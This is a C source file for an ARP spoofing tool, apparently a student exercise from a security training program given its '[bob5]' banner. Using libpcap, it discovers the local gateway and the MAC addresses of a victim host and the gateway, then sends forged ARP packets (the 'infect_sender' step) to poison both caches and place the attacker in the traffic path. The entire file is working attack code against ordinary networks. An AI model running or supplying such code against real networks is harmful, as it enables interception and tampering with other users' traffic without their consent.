#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/ethernet.h>
#include <netinet/ether.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <pthread.h>

#define MACADDR_FILE    "/sys/class/net/ens33/address"
#define GATEWAY_FILE   "/proc/net/route"
#define NETWORK_NAME    "ens33"
#define BUF_SIZE        32


struct route_info {
    char iface[IFNAMSIZ];
    unsigned int dest;
    unsigned int receiver;
    unsigned short flag;
    unsigned int refcnt;
    unsigned int use;
    unsigned int metric;
    unsigned int mask;
    unsigned int mtu;
    unsigned int window;
    unsigned int irtt;
} rtinfo;


struct ether_header eth_hdr;
struct arphdr arp_hdr;
struct ether_arp eth_arp;

struct in_addr my_ip, sender_ip, receiver_ip;
u_int8_t my_mac[ETH_ALEN], sender_mac[ETH_ALEN], receiver_mac[ETH_ALEN];

pcap_t *handle;
u_char *infected_packet;
char *dev, errbuf[PCAP_ERRBUF_SIZE];


/* set up pcap setting to capture the arp packet */
int setup_pcap()
{
    struct bpf_program fp;

    bpf_u_int32 mask;
    bpf_u_int32 net;

    char filter_exp[] = "";

    dev = pcap_lookupdev(errbuf);
    if (dev == NULL) {
        fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
        return(2);
    }

    if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
        fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
        net = 0;
        mask = 0;
    }

    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        return(2);
    }

    if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
        fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
        return(2);
    }

    if (pcap_setfilter(handle, &fp) == -1) {
        fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
        return(2);
    }

    return 0;
}


/* print out arp packet information */
void print_arppckt_info()
{
    char src_macaddr[ETH_ALEN * 2 + 6], dst_macaddr[ETH_ALEN * 2 + 6];
    char sender_macaddr[ETH_ALEN * 2 + 6], sender_ipaddr[INET_ADDRSTRLEN];
    char target_macaddr[ETH_ALEN * 2 + 6], target_ipaddr[INET_ADDRSTRLEN];

    ether_ntoa_r((struct ether_addr *)&eth_hdr.ether_shost, src_macaddr);
    ether_ntoa_r((struct ether_addr *)&eth_hdr.ether_dhost, dst_macaddr);
    ether_ntoa_r((struct ether_addr *)eth_arp.arp_sha, sender_macaddr);
    inet_ntop(AF_INET, eth_arp.arp_spa, sender_ipaddr, INET_ADDRSTRLEN);
    ether_ntoa_r((struct ether_addr *)eth_arp.arp_tha, target_macaddr);
    inet_ntop(AF_INET, eth_arp.arp_tpa, target_ipaddr, INET_ADDRSTRLEN);

    printf("\n========  ARP PACKET INFORMATION  ========\n");
    printf("------------ ETHERNET PACKET ------------\n");
    printf("SOURCE MAC ADDRESS\t: %s\n", src_macaddr);
    printf("DESTINATION MAC ADDRESS\t: %s\n", dst_macaddr);
    printf("PROTOCOL TYPE\t\t: %X\n", ntohs(eth_hdr.ether_type));
    printf("------------ ARP HEADER      ------------\n");
    printf("ARP HARDWARE TYPE\t: %X\n", ntohs(arp_hdr.ar_hrd));
    printf("ARP HARWARE LENGTH\t: %X\n", arp_hdr.ar_hln);
    printf("ARP PROTOCOL\t\t: %X\n", ntohs(arp_hdr.ar_pro));
    printf("ARP PROTOCOL LENGTH\t: %X\n", arp_hdr.ar_pln);
    printf("ARP OPERATION\t\t: %X\n", ntohs(arp_hdr.ar_op));
    printf("SENDER MAC ADDRESS\t: %s\n", sender_macaddr);
    printf("SENDER IP ADDRESS\t: %s\n", sender_ipaddr);
    printf("TARGET MAC ADDRESS\t: %s\n", target_macaddr);
    printf("TARGET IP ADDRESS\t: %s\n", target_ipaddr);
    printf("-----------------------------------------\n");
}


/* capture arp request and reply packet */
void *arp_pckt_cap(void *arg)
{
    struct ether_header *eth_hdr;
    struct ether_arp *eth_arp;

    struct pcap_pkthdr header;
    const u_char *arp_reply;

    while( 1 ) {
        /* Grab a packet */
        arp_reply = pcap_next(handle, &header);
        if(!arp_reply) continue;

        eth_hdr = (struct ether_header *)arp_reply;
        eth_arp = (struct ether_arp *)(arp_reply + sizeof(struct ether_header));

        if(ntohs(eth_hdr->ether_type) == ETHERTYPE_ARP) {
            if(ntohs(eth_arp->ea_hdr.ar_op) == ARPOP_REPLY)   {
                if(!memcmp(eth_arp->arp_spa, &sender_ip, 4)) memcpy(sender_mac, eth_arp->arp_sha, ETH_ALEN);
                else if(!memcmp(eth_arp->arp_spa, &receiver_ip, 4)) memcpy(receiver_mac, eth_arp->arp_sha, ETH_ALEN);

                pthread_exit(NULL);
            }
        }
    }
}


/* send arp request packet to someone pointed */
void send_arprqst_pckt(struct in_addr *someone_ip, int type)
{
    u_char *arp_rqst_pckt;
    pthread_t tid;

    // ARP request packet for receiver to get receiver's MAC address
    pthread_create(&tid, NULL, arp_pckt_cap, (void *)&type);

    eth_hdr.ether_type  = htons(ETHERTYPE_ARP);
    memcpy(&eth_hdr.ether_shost, my_mac, ETH_ALEN);
    memset(&eth_hdr.ether_dhost, 0xFF, ETH_ALEN);

    arp_hdr.ar_hrd = htons(1);
    arp_hdr.ar_hln = 6; //htons(6);
    arp_hdr.ar_pro = htons(2048);
    arp_hdr.ar_pln = 4; //htons(4);
    arp_hdr.ar_op  = htons(ARPOP_REQUEST);

    eth_arp.ea_hdr = arp_hdr;
    memcpy(eth_arp.arp_sha, my_mac, ETH_ALEN);
    memcpy(eth_arp.arp_spa, &my_ip, 4);
    memset(eth_arp.arp_tha, 0x00, ETH_ALEN);
    memcpy(eth_arp.arp_tpa, someone_ip, 4);

    arp_rqst_pckt = (u_char *)malloc(sizeof(struct ether_header) + sizeof(struct ether_arp));
    memcpy(arp_rqst_pckt, &eth_hdr, sizeof(struct ether_header));
    memcpy(arp_rqst_pckt + sizeof(struct ether_header), &eth_arp, sizeof(struct ether_arp));

    print_arppckt_info();

    pcap_sendpacket(handle, arp_rqst_pckt, sizeof(struct ether_header) + sizeof(struct ether_arp));
    pthread_join(tid, NULL);

    free(arp_rqst_pckt);
}


/* send arp reply packet to someone pointed */
void send_arprply_pckt(struct in_addr *sip, unsigned char *smac, struct in_addr *rip)
{
    u_char *arp_rply_pckt;

    eth_hdr.ether_type  = htons(ETHERTYPE_ARP);
    memcpy(&eth_hdr.ether_shost, my_mac, ETH_ALEN);
    memcpy(&eth_hdr.ether_dhost, sender_mac, ETH_ALEN);
    //memset(&eth_hdr.ether_dhost, 0xFF, ETH_ALEN);

    arp_hdr.ar_hrd = htons(1);
    arp_hdr.ar_hln = 6; //htons(6);
    arp_hdr.ar_pro = htons(2048);
    arp_hdr.ar_pln = 4; //htons(4);
    arp_hdr.ar_op  = htons(ARPOP_REQUEST);

    eth_arp.ea_hdr = arp_hdr;
    memcpy(eth_arp.arp_sha, my_mac, ETH_ALEN);
    memcpy(eth_arp.arp_spa, rip, 4);
    memcpy(eth_arp.arp_tha, smac, ETH_ALEN);
    memcpy(eth_arp.arp_tpa, sip, 4);

    arp_rply_pckt = (u_char *)malloc(sizeof(struct ether_header) + sizeof(struct ether_arp));
    memcpy(arp_rply_pckt, &eth_hdr, sizeof(struct ether_header));
    memcpy(arp_rply_pckt + sizeof(struct ether_header), &eth_arp, sizeof(struct ether_arp));

    print_arppckt_info();

    pcap_sendpacket(handle, arp_rply_pckt, sizeof(struct ether_header) + sizeof(struct ether_arp));

    free(arp_rply_pckt);
}


/* get my mac and ip address using ioctl */
void get_macandip()
{
    struct ifreq ifr;
    int sock;

    sock = socket(AF_INET, SOCK_STREAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, NETWORK_NAME, IFNAMSIZ-1);

    ioctl(sock, SIOCGIFHWADDR, &ifr);   // get my mac adress and put into ethernet header
    memcpy(my_mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);

    ioctl(sock, SIOCGIFADDR, &ifr);     // get my ip address and put into ip header
    memcpy(&my_ip, &(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr), 4);

    close(sock);
}


/* get ip address of receiver */
void get_receiverip()
{
    FILE *route_fp;
    char column[BUF_SIZE];

    route_fp = fopen(GATEWAY_FILE, "rt");
    while(fscanf(route_fp, "%s", column)) if(!strcmp(column, "IRTT")) break;
    while(1) {
        fscanf(route_fp, "%s\t%X\t%X\t%X\t%X\t%X\t%X\t%X\t%X\t%X\t%X",
               rtinfo.iface, &rtinfo.dest, &rtinfo.receiver, &rtinfo.flag,
               &rtinfo.refcnt, &rtinfo.use, &rtinfo.metric, &rtinfo.mask,
               &rtinfo.mtu, &rtinfo.window, &rtinfo.irtt);
        if(feof(route_fp)) break;
        if(rtinfo.dest == 0x00000000 && rtinfo.mask == 0x00000000) {
            memcpy(&receiver_ip, &rtinfo.receiver, 4); break;
        }
    }

    fclose(route_fp);
}


/* send ARP request packet to sender and receiver and get sender's and receiver's MAC */
void get_vctmgwmac()
{
    send_arprqst_pckt(&receiver_ip, 0);
    send_arprqst_pckt(&sender_ip, 1);
}


/* send infected ARP reply packet to sender and receiver */
void infect_sender()
{
    send_arprply_pckt(&sender_ip, sender_mac, &receiver_ip);
    send_arprply_pckt(&receiver_ip, receiver_mac, &sender_ip);
}


int main(int argc, char *argv[])
{
    char my_ipaddr[INET_ADDRSTRLEN], sender_ipaddr[INET_ADDRSTRLEN];
    char receiver_ipaddr[INET_ADDRSTRLEN];
    char my_macaddr[ETH_ALEN * 2 + 6], sender_macaddr[ETH_ALEN * 2 + 6];
    char receiver_macaddr[ETH_ALEN * 2 + 6];

    char *track = "취약점";
    char *name  = "신동민";
    printf("[bob5][%s]send_arp[%s]\n", track, name);

    setup_pcap();

    strncpy(sender_ipaddr, argv[1], INET_ADDRSTRLEN);
    inet_pton(AF_INET, sender_ipaddr, &sender_ip.s_addr);

    printf("\n========== GETTING SENDER'S IP ==========\n\n");
    printf("SENDER'S IP\t: %s\n", sender_ipaddr);

    /* step 1. get my mac and ip address using ioctl */
    printf("\n============= GETTING MY IP =============\n\n");
    get_macandip();
    inet_ntop(AF_INET, &my_ip.s_addr, my_ipaddr, INET_ADDRSTRLEN);
    ether_ntoa_r((struct ether_addr *)my_mac, my_macaddr);
    printf("MY IP\t\t: %s\n", my_ipaddr);
    printf("MY MAC\t\t: %s\n", my_macaddr);

    /* step 2. get ip address of receiver */
    printf("\n========== GETTING receiver'S IP =========\n\n");
    get_receiverip();
    inet_ntop(AF_INET, &receiver_ip.s_addr, receiver_ipaddr, INET_ADDRSTRLEN);
    printf("RECEIVER's IP\t: %s\n", receiver_ipaddr);

    /* step 3. send ARP request to sender and receiver and get sender's and receiver's MAC */
    printf("\n= GETTING SENDER AND receiver'S MAC ADDR =\n\n");
    get_vctmgwmac();
    ether_ntoa_r((struct ether_addr *)receiver_mac, receiver_macaddr);
    ether_ntoa_r((struct ether_addr *)sender_mac, sender_macaddr);
    printf("RECEIVER'S MAC\t\t: %s\n", receiver_macaddr);
    printf("SENDER'S MAC\t\t: %s\n", sender_macaddr);

    /* step 4. send infected ARP reply packet to sender and receiver */
    printf("\n======== INFECTING VICTIM(SENDER) ========\n");
    infect_sender();
    printf("FINISHED TO INFECT !\t: %s\n", sender_ipaddr);

    pcap_close(handle);
    return 0;
}
